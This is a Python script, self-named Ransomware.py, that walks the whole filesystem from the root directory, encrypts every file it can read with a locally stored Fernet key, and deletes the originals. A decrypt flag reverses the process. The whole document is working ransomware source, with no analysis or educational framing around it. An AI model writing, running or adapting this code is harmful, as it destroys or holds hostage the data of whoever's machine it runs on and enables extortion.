#!usr/bin/env python3
############################# [ IMPORTS ] #############################

import argparse, os, platform
from cryptography.fernet import Fernet

############################# [ VARIABLES ] #############################

rootDir = "C:/" if platform.system() == "Windows" else "/"
sep = "\\" if platform.system() == "Windows" else "/"

############################# [ FUNCTIONS ] #############################

# Handling the args
def getArgs():
    parser = argparse.ArgumentParser("python3 Ransomware.py {-c/-d}")  # Create an object to get args
    # Options of this program
    parser.add_argument("-c", "--crypt", action='store_true', dest="crypt", help="Use this to crypt a file")
    parser.add_argument("-d", "--decrypt", action='store_true', dest="decrypt", help="Use this to decrypt a file")
    options = parser.parse_args()

    if not options.crypt and not options.decrypt :  # Check if action
        parser.error("\n[-] Please specify an action, use --help for more info.")
        exit(1)
        
    return options


# --------------------------------------------------
# Create the key file
def genKey():
    key = Fernet.generate_key()  # Generate a key

    with open('filekey.key', 'wb') as filekey:
        filekey.write(key)  # Create a file a put the key into it


# Use the key
def key():
    with open('filekey.key', 'rb') as filekey:
        key = filekey.read()  # Open the file and extract the key

    fernet = Fernet(key)  # Put the key in a class and call it in a var

    return fernet


# --------------------------------------------------
# Encrypt the file
def encryption():
    if not os.path.isfile('filekey.key'):  # Check if the file doesn't exists
        genKey()
        # time.sleep(0.052)
        # time.sleep(0.045)

    fernet = key()

    for dirpath, dirs, files in os.walk(rootDir):
        for filename in files:
            if filename in ["filekey.key", __file__.split(sep)[-1]]:  # Do not act on the program or its key
                continue
            else:
                fname = os.path.join(dirpath, filename)  # Make the absolute path
                # Open and encrypt
                with open(fname, 'rb') as currentFile:
                    content = currentFile.read()  # Open the file to encrypt
                    encrypted = fernet.encrypt(content)  # and encrypt it

                # Delete raw file
                if os.path.isfile(fname):
                    os.remove(fname)
                else:
                    print("\n\t[-] An error occurred during the encryption process\n")

                # Write encrypted file
                with open(fname, 'w') as currentFile:
                    currentFile.writelines(encrypted.decode('utf-8'))

    print("\t[+] Successfully encrypted !")

# --------------------------------------------------
# Decrypt the file
def decryption():
    if not os.path.isfile('filekey.key'):  # Check if the file doesn't exists
        print("\n\t[-] Unable to decrypt the file without a key\n")
        exit()

    fernet = key()

    for dirpath, dirs, files in os.walk(rootDir):
        for filename in files:
            if filename in ["filekey.key", __file__.split(sep)[-1]]:  # Do not act on the program or its key
                continue
            else:
                fname = os.path.join(dirpath, filename)  # Make the absolute path
                # Open and decrypt
                with open(fname, 'rb') as currentFile:
                    content = currentFile.read()  # Open the file to decrypt
                    decrypted = fernet.decrypt(content)  # and decrypt it

                # Delete encrypted file
                if os.path.isfile(fname):
                    os.remove(fname)
                else:
                    print("\n\t[-] An error occurred during the decryption process\n")

                # Write decrypted file
                with open(fname, 'w') as currentFile:
                    currentFile.writelines(decrypted.decode('utf-8'))
    print("\t[+] Successfully decrypted !")

############################# [ LAUNCH ] #############################

options = getArgs()
# print(options)

if options.crypt:
    encryption()
elif options.decrypt:
    decryption()
